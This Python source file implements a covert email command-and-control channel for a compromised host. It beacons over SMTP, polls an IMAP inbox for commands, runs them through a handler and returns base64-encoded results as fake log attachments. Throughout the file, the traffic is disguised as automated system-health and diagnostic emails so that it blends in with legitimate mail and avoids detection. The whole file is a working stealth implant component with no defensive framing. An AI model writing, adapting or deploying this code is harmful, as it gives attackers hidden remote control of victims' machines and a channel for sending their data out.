"""Email C2 Channel — Covert command and control over SMTP/IMAP.

Blends with legitimate email traffic using standard email protocols.
Beacons appear as automated system notification or monitoring emails.
"""

import base64
import json
import os
import random
import re
import sys
import threading
import time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from typing import Any, Callable, Dict, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


class EmailC2Channel:
    """C2 channel over SMTP/IMAP email protocols.

    Uses email for bidirectional C2:
      - Outbound (beacons/results): SMTP
      - Inbound (commands): IMAP polling

    Commands are encoded in email subjects with a configurable prefix
    to blend in with legitimate auto-generated system emails.
    """

    def __init__(
        self,
        smtp_server: str = "smtp.gmail.com",
        smtp_port: int = 587,
        imap_server: str = "imap.gmail.com",
        imap_port: int = 993,
        email_address: str = "",
        email_password: str = "",
        command_prefix: str = "[SYSTEM]",
        beacon_interval: int = 300,
        poll_interval: int = 60,
        use_tls: bool = True,
        target_identifier: Optional[str] = None,
    ):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.imap_server = imap_server
        self.imap_port = imap_port
        self.email_address = email_address or os.getenv("C2_EMAIL_ADDRESS", "")
        self.email_password = email_password or os.getenv("C2_EMAIL_PASSWORD", "")
        self.command_prefix = command_prefix
        self.beacon_interval = beacon_interval
        self.poll_interval = poll_interval
        self.use_tls = use_tls
        self.target_id = target_identifier or f"host_{os.urandom(4).hex()}"
        self._running = False
        self._beacon_thread: Optional[threading.Thread] = None
        self._poll_thread: Optional[threading.Thread] = None
        self._command_handler: Optional[Callable] = None
        self._connected = False
        self._last_beacon = 0.0
        self._sent_emails: set = set()

        if not self.email_address or not self.email_password:
            logger.warning(
                "Email C2 credentials not set. Set C2_EMAIL_ADDRESS and "
                "C2_EMAIL_PASSWORD env vars."
            )

    def start(self, command_handler: Optional[Callable] = None) -> bool:
        self._command_handler = command_handler
        self._running = True
        self._connected = True

        self._beacon_thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._beacon_thread.start()

        self._poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._poll_thread.start()

        logger.info(f"Email C2 started: {self.email_address} via {self.smtp_server}")
        return True

    def stop(self):
        self._running = False
        self._connected = False
        logger.info("Email C2 stopped")

    def send_beacon(self, data: Optional[Dict] = None) -> bool:
        """Send a beacon/result via SMTP"""
        if not self._check_credentials():
            return False
        try:
            import smtplib

            payload = data or {}
            payload["id"] = self.target_id
            payload["ts"] = datetime.utcnow().isoformat()
            body = base64.b64encode(json.dumps(payload).encode()).decode()

            msg = MIMEMultipart()
            msg["From"] = self.email_address
            msg["To"] = self.email_address
            msg["Subject"] = self._make_subject("beacon")

            alt = MIMEMultipart("alternative")
            plain_part = MIMEText(self._make_legitimate_body("sensor_reading"), "plain")
            html_part = MIMEText(self._make_legitimate_body("sensor_reading_html"), "html")
            alt.attach(plain_part)
            alt.attach(html_part)
            msg.attach(alt)

            attachment = MIMEText(body, "plain")
            attachment.add_header(
                "Content-Disposition",
                "attachment",
                filename=f"report_{int(time.time())}.log",
            )
            msg.attach(attachment)

            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            if self.use_tls:
                server.starttls()
            server.login(self.email_address, self.email_password)
            server.send_message(msg)
            server.quit()

            self._last_beacon = time.time()
            logger.debug(f"Email beacon sent: {payload.get('id', '')}")
            return True
        except Exception as e:
            logger.warning(f"Email beacon failed: {e}")
            return False

    def send_result(self, command_id: str, result: Dict) -> bool:
        """Send command execution result via SMTP"""
        if not self._check_credentials():
            return False
        try:
            import smtplib

            payload = {
                "id": self.target_id,
                "cmd_id": command_id,
                "result": result,
                "ts": datetime.utcnow().isoformat(),
            }
            body = base64.b64encode(json.dumps(payload).encode()).decode()

            msg = MIMEMultipart()
            msg["From"] = self.email_address
            msg["To"] = self.email_address
            msg["Subject"] = self._make_subject("result")

            alt = MIMEMultipart("alternative")
            alt.attach(MIMEText(self._make_legitimate_body("log_upload"), "plain"))
            alt.attach(MIMEText(self._make_legitimate_body("log_upload_html"), "html"))
            msg.attach(alt)

            attachment = MIMEText(body, "plain")
            attachment.add_header(
                "Content-Disposition",
                "attachment",
                filename=f"log_{int(time.time())}.txt",
            )
            msg.attach(attachment)

            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            if self.use_tls:
                server.starttls()
            server.login(self.email_address, self.email_password)
            server.send_message(msg)
            server.quit()

            logger.debug(f"Email result sent for command {command_id}")
            return True
        except Exception as e:
            logger.warning(f"Email result failed: {e}")
            return False

    def _poll_commands(self) -> list:
        """Poll IMAP inbox for commands"""
        if not self._check_credentials():
            return []
        try:
            import email as email_lib
            import imaplib

            server = imaplib.IMAP4_SSL(self.imap_server, self.imap_port)
            server.login(self.email_address, self.email_password)
            server.select("INBOX")

            _, message_ids = server.search(None, f'(UNSEEN SUBJECT "{self.command_prefix}")')
            commands = []
            for msg_id in message_ids[0].split() if message_ids[0] else []:
                _, msg_data = server.fetch(msg_id, "(RFC822)")
                raw_email = msg_data[0][1]
                msg = email_lib.message_from_bytes(raw_email)

                subject = msg["Subject"] or ""
                cmd_text = subject.replace(f"{self.command_prefix} ", "", 1).strip()

                body = ""
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            try:
                                body = part.get_payload(decode=True).decode(errors="replace")
                            except Exception:
                                pass
                            break
                else:
                    try:
                        body = msg.get_payload(decode=True).decode(errors="replace")
                    except Exception:
                        pass

                try:
                    payload = json.loads(base64.b64decode(body).decode())
                except Exception:
                    payload = {}

                if cmd_text and msg_id not in self._sent_emails:
                    commands.append(
                        {
                            "id": msg_id.decode() if isinstance(msg_id, bytes) else msg_id,
                            "command": cmd_text,
                            "payload": payload,
                            "sender": msg["From"] or "",
                            "timestamp": msg["Date"] or "",
                        }
                    )
                    self._sent_emails.add(msg_id.decode() if isinstance(msg_id, bytes) else msg_id)

            server.logout()
            return commands
        except Exception as e:
            logger.debug(f"Email poll failed: {e}")
            return []

    def _beacon_loop(self):
        while self._running:
            try:
                if time.time() - self._last_beacon >= self.beacon_interval:
                    self.send_beacon()
            except Exception as e:
                logger.debug(f"Beacon loop error: {e}")
            time.sleep(self.beacon_interval / 4)

    def _poll_loop(self):
        while self._running:
            try:
                commands = self._poll_commands()
                for cmd in commands:
                    logger.info(f"Email command received: {cmd['command']}")
                    if self._command_handler:
                        try:
                            result = self._command_handler(cmd["command"], cmd["payload"])
                            self.send_result(cmd["id"], result)
                        except Exception as e:
                            self.send_result(cmd["id"], {"error": str(e)})
            except Exception as e:
                logger.debug(f"Poll loop error: {e}")
            time.sleep(self.poll_interval)

    def _make_subject(self, msg_type: str) -> str:
        prefixes = {
            "beacon": [
                "[STATUS] System health check complete",
                "[NOTICE] Scheduled maintenance completed",
                "[INFO] Backup verification report",
                "[ALERT] Performance metrics collected",
            ],
            "result": [
                "[STATUS] Log upload complete",
                "[INFO] Diagnostic data collected",
                "[NOTICE] Report generation finished",
            ],
        }
        base = random.choice(prefixes.get(msg_type, prefixes["beacon"]))
        return f"{self.command_prefix} {base}"

    def _make_legitimate_body(self, body_type: str) -> str:
        bodies = {
            "sensor_reading": (
                "System Health Report\n"
                "====================\n"
                "Status: All services running normally\n"
                f"Timestamp: {datetime.utcnow().isoformat()}\n"
                "CPU: 23%\n"
                "Memory: 45%\n"
                "Disk: 67%\n"
                "Uptime: 14d 6h 32m\n"
                "\n"
                "This is an automated system message.\n"
            ),
            "sensor_reading_html": (
                "<html><body>"
                "<h3>System Health Report</h3>"
                "<pre>Status: All services running normally</pre>"
                f"<p>Timestamp: {datetime.utcnow().isoformat()}</p>"
                "<p>This is an automated system message.</p>"
                "</body></html>"
            ),
            "log_upload": (
                "Diagnostic Log Upload\n"
                "=====================\n"
                f"Host: {self.target_id}\n"
                f"Time: {datetime.utcnow().isoformat()}\n"
                "Log file attached.\n"
            ),
            "log_upload_html": (
                "<html><body>"
                "<h3>Diagnostic Log Upload</h3>"
                f"<p>Host: {self.target_id}</p>"
                "<p>Log file attached.</p>"
                "</body></html>"
            ),
        }
        return bodies.get(body_type, bodies["sensor_reading"])

    def _check_credentials(self) -> bool:
        if not self.email_address or not self.email_password:
            logger.debug("Email C2: credentials not configured")
            return False
        return True

    @property
    def connected(self) -> bool:
        return self._connected

    def get_stats(self) -> Dict:
        return {
            "connected": self._connected,
            "running": self._running,
            "target_id": self.target_id,
            "email": self.email_address,
            "smtp": f"{self.smtp_server}:{self.smtp_port}",
            "imap": f"{self.imap_server}:{self.imap_port}",
            "poll_interval": self.poll_interval,
            "beacon_interval": self.beacon_interval,
            "sent_emails": len(self._sent_emails),
        }
